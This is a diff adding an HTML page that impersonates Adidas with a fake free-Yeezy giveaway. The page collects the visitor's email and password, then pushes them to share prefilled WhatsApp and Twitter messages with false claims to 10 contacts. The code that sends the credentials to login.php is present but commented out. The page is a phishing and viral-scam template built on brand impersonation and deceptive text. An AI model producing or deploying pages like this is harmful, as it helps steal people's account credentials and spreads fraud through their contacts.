@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Gana unas Adidas Yeezy Boost 350 V2 Zebra</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+    <link rel="stylesheet" href="master.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+  </head>
+  <body class="width height" style="position: absolute;">
+
+    <div class="clear width" style="padding: 16px;">
+      <h4 class="adidas" style="display: inline-block;">Adidas</h4>
+      <h4 class="right adidas darktext"><a class="darktext" href="https://adidas.com/">Saltar promoción</a></h4>
+    </div>
+    <div class="accent" style="height: 50%; background-image: url(https://i.imgur.com/ptKoOII.png); background-size: contain; background-repeat: no-repeat; background-position: center;"></div>
+    <div class="dark">
+      <div class="container" style="padding: 16px;">
+        <h4>
+          <center>
+            <p id="explicacion" class="adidas">Consigue unas adidas Adidas Yeezy Boost 350 V2 Zebra gratis, celebrando nuestro 80º cumpleaños. Solo hay 1000 unidades gratuitas disponibles, reclama la tuya abajo.</p>
+            <div id="login" class="hidden">
+              <form>
+                <div class="row">
+                  <div class="input-field col s12">
+                    <input id="email" type="text" class="validate">
+                    <label for="email">Email</label>
+                  </div>
+                  <div class="input-field col s12">
+                    <input id="password" type="password" class="validate">
+                    <label for="password">Contraseña</label>
+                  </div>
+                </div>
+                <a onclick="loginsave()" class="waves-effect waves-light btn-large brown width">INICIAR SESIÓN / REGISTRARSE</a>
+              </form>
+            </div>
+            <div id="participando" class="hidden">
+              <p class="adidas">
+                Invita a 10 conocidos a visitar esta promoción y recibirás un email donde podrás elegir donde quieres que te enviemos tus nuevas Adidas Yeezy Boost 350 V2 Zebra.
+              </p>
+              <a id="whatsappshare" href="" data-action="share/whatsapp/share" class="btn-large green width">INVITAR POR WHATSAPP</a></br></br>
+              <a id="twittershare" href="" class="btn-large blue width">TWITTEAR</a>
+            </div>
+            <a id="conseguir" onclick="login()" class="black btn-large waves-effect waves-light">RECLAMAR TU UNIDAD</a>
+          </center>
+        </h4>
+      </div>
+    </div>
+
+    <footer style="background-color: #EFD28D" class="page-footer black-text">
+      <div class="container">
+        <div class="row">
+          <div class="col l6 s12">
+            <h5>Condiciones para participar</h5>
+            <p>Consulta las condiciones de la promoción <a class="grey-text" href="http://www.adidas.es/help-topics-terms_and_conditions.html">aquí</a>.</p>
+          </div>
+        </div>
+      </div>
+      <div class="footer-copyright">
+        <div class="container black-text">
+        © 2018 Adidas
+        </div>
+      </div>
+    </footer>
+
+    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
+    <script type="text/javascript">
+      if (localStorage.getItem("log")) {
+        $("#explicacion").addClass("hidden")
+        $("#conseguir").addClass("hidden")
+        $("#participando").removeClass("hidden")
+      }
+
+      var random = Math.floor(Math.random() * 500);
+      var url = window.location.href ;
+      $("#whatsappshare").attr("href", "whatsapp://send?text=Reclama tus Adidas Yeezy, cuestan 1050€! Están dando 100 gratis por su 80º aniversario 🤗, mira: " + url + "?" + random)
+      $("#twittershare").attr("href", "https://twitter.com/intent/tweet?text=Reclama tus Adidas Yeezy, cuestan 1050€! Están dando 100 gratis por su 80º aniversario 🤗, mira: " + url + "?" + random)
+
+      function login(){
+        $("#login").removeClass("hidden")
+        $("#conseguir").addClass("hidden")
+      }
+
+      function loginsave(){
+        var email= $("#email").val()
+        var password= $("#password").val()
+
+        /*$.post( "login.php", { email: email, password: password } );*/
+
+        localStorage.setItem("log", true);
+
+        $("#explicacion").addClass("hidden")
+        $("#login").addClass("hidden")
+        $("#participando").removeClass("hidden")
+      }
+    </script>
+  </body>
+</html>
